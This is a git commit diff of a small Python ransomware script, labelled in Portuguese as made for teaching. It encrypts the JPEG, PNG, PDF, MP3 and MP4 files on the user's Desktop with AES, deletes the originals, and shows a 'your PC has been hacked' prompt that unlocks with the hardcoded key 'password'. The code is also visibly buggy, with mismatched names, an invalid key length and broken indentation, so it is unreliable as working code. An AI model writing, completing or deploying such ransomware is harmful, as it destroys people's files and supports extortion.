5b6a7f27fa5de06654705dc5e9c88c3fe93d96a5
Arthur Corona <coronaggp@gmail.com>
2022-06-01 00:01:53 -0300

    lib. pyaes tilt

--- no_is_a_goodware.py
+++ no_is_a_goodware.py
@@ -1,24 +1,26 @@
-# ransonware feito com python para fins didáticos
+# ransonware feito com python para fins didáticos 
+# encripta os arquivos que tiverem no desktop e estiverem de acordo com o "type_files"
 
-# importando bibliotecas
- 
+# libraries import
+
 from multiprocessing.sharedctypes import Value
-import os
-import glob 
-import time
-import pyaes
-from pathlib import path
+import os # operacional system
+import glob # search files
+import time # time
+import pyaes # crypto
+from pathlib import path # cd
 
 type_fyles = ["*.jpeg", "*.jpg", "*png", "*.pdf", "*.mp3", "*.mp4"]
 
 print ('encrypting')
-time.sleep(3)
+time.sleep(5) #time for encrypt
 
 #check in desktop
 
 try:
     desktop = Path.home() / "Desktop"
-
+#   download = Path.home() / "Downloads"            obs: posso escolher qualquer lugar para encriptar, nesse caso, esolhi o desktop 
+ 
 except Exception: 
     pass
 
@@ -33,7 +35,7 @@ def encrypting():
             f.close()
 
             os.remove(f'{desktop}\\{format_fyle}')
-            key = "password" # pass for decrypt
+            key = b"password" # pass for decrypt
             aes = pyaes.AESModeOfOperationCTR(key)
             crypto_data = aes.encrypt(file_data)
 
@@ -45,8 +47,8 @@ def encrypting():
             new_file.close()
 
 def decrypting(decrypt_file):
-    try:
-        for file in glob.glob('*.ransomware'):
+    try:    
+        for file in glob.glob('*.ransomware'): # encrypt .ransonware files
 
             keybytes = decrypt_file.encode()
             name_file = open(file, 'rb')
@@ -61,23 +63,37 @@ def decrypting(decrypt_file):
             dnew_file = open(f'{desktop}\\{new_file_name}', 'wb')
             dnew_file.write(decrypt_data)
             dnew_file.close()
-
-            # if incorrect password :
-
-            except ValueError as err: 
-                print('Invalid Password!')
             
 if __name__ == '__main__':
     encrypting()
     if encrypting:
         key = input('your PC has been hacked, enter password to unlock!')
-        if key == 'password'
+        if key == 'password':
+              decrypting(key)
+            for del_file in glob.glob('*.ransomware'):
+                os.remove(f'{desktop}\\{del_file}')
+        else:
+            print('Chave de liberação inválida!!!')
 
-    descrypting(key)
-    for del_file in glob.glob('*ransomware'):
-        os.remove(f'{desktop}\\{del_file}')
 
-    else:
-        print('Incorrect Password!')
 
-        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
